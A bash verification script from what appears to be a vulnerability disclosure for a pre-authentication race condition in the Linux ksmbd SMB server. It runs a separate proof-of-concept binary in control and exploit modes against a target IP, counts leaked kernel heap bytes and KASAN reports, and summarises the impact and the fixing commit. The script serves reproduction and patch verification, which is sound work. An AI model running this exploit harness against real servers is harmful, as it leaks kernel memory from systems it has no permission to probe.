#!/bin/bash
# Author: al4n4n (Dadb0d)
# Verification dashboard for ZDI-CAN-33774.
# Run inside the QEMU VM (needs dmesg access).
set -u

HOST="${1:?Usage: bash verify.sh <target-ip> [opsflip-path]}"
OPSFLIP="${2:-./poc/opsflip}"

RED='\033[0;31m'; GRN='\033[0;32m'; YEL='\033[0;33m'
CYN='\033[0;36m'; BLD='\033[1m'; RST='\033[0m'

echo ""
echo -e "${BLD}================================================================${RST}"
echo -e "${BLD}  ZDI-CAN-33774  --  ksmbd Protocol Dispatch Race Condition${RST}"
echo -e "${BLD}  Verification Dashboard${RST}"
echo -e "${BLD}================================================================${RST}"
echo ""

echo -e "${CYN}Environment:${RST}"
echo "  Target:   $HOST"
echo "  PoC:      $OPSFLIP"
KVER=$(uname -r 2>/dev/null || echo "unknown")
echo "  Kernel:   $KVER"
echo ""

if [ ! -x "$OPSFLIP" ]; then
    echo -e "${RED}[!] opsflip not found: $OPSFLIP${RST}"
    echo "    Build: cd poc && make"
    exit 2
fi

# Phase 1: Control
echo -e "${BLD}--- Phase 1: Control (-S 64, no OOB expected) ---${RST}"
dmesg -C 2>/dev/null
CTRL=$("$OPSFLIP" -h "$HOST" -m control -C 2 -I 200 -B 32 -S 64 2>&1)
sleep 1
CTRL_KASAN=$(dmesg 2>/dev/null | grep -c "BUG: KASAN\|slab-out-of-bounds")

CTRL_LEAKS=$(echo "$CTRL" | grep -oP 'LEAKS=\K[0-9]+' | awk '{s+=$1}END{print s+0}')
if [ "$CTRL_LEAKS" -eq 0 ] && [ "$CTRL_KASAN" -eq 0 ]; then
    echo -e "  ${GRN}[+] Control: 0 leaks, 0 KASAN reports -- baseline clean${RST}"
else
    echo -e "  ${YEL}[!] Control: leaks=$CTRL_LEAKS kasan=$CTRL_KASAN (unexpected)${RST}"
fi
echo ""

# Phase 2: Exploit
echo -e "${BLD}--- Phase 2: Exploit (-S 35, OOB read expected) ---${RST}"
dmesg -C 2>/dev/null
EXPLOIT=$("$OPSFLIP" -h "$HOST" -m exploit -C 4 -I 500 -B 64 -S 35 2>&1)
sleep 2
EXP_KASAN=$(dmesg 2>/dev/null | grep -c "BUG: KASAN\|slab-out-of-bounds")

EXP_LEAKS=$(echo "$EXPLOIT" | grep -oP 'LEAKS=\K[0-9]+' | awk '{s+=$1}END{print s+0}')
EXP_NZ=$(echo "$EXPLOIT" | grep -oP 'nonzero=\K[0-9]+' | awk '{s+=$1}END{print s+0}')
echo "  Leaks on wire: $EXP_LEAKS (non-zero bytes: $EXP_NZ)"
echo "  KASAN reports: $EXP_KASAN"

SAMPLES=$(echo "$EXPLOIT" | grep "OPSFLIP:exploit:LEAK" | head -4)
if [ -n "$SAMPLES" ]; then
    echo ""
    echo -e "${RED}Leaked samples:${RST}"
    echo "$SAMPLES"
fi
echo ""

# Phase 3: Crash evidence
echo -e "${BLD}--- Phase 3: Crash Evidence (dmesg) ---${RST}"
KASAN_LOG=$(dmesg 2>/dev/null | grep -B2 -A15 "BUG: KASAN" | head -25)
if [ -n "$KASAN_LOG" ]; then
    echo -e "${RED}KASAN report:${RST}"
    echo "$KASAN_LOG"
else
    echo "  (no KASAN report in dmesg)"
fi
echo ""

# Phase 4: Negative control guidance
echo -e "${BLD}--- Phase 4: Negative Control ---${RST}"
echo "  To verify the fix, boot a kernel with commit 68f410faedaf"
echo "  (ksmbd: wait for negotiation before receiving another PDU)"
echo "  and re-run. The patched kernel should show 0 leaks and 0 KASAN."
echo ""

# Verdict
echo -e "${BLD}================================================================${RST}"
if [ "$EXP_LEAKS" -gt 0 ] || [ "$EXP_KASAN" -gt 0 ]; then
    echo -e "  Verdict: ${RED}${BLD}VULNERABLE${RST}"
    echo ""
    echo "  Impact:"
    echo "    OOB heap read: 28 bytes past 40-byte kmalloc-64 allocation"
    echo "    Read origin:   init_smb2_rsp_hdr (smb2pdu.c:661)"
    echo "    Alloc origin:  ksmbd_conn_handler_loop (connection.c:679)"
    echo "    Wire leak:     SessionId + Signature fields in error reply"
    echo "    Pre-auth:      yes (guest share, no credentials needed)"
    echo "    Consequence:   kernel heap info leak, demonstrates path to RCE"
else
    echo -e "  Verdict: ${GRN}${BLD}NOT VULNERABLE${RST}"
fi
echo -e "${BLD}================================================================${RST}"
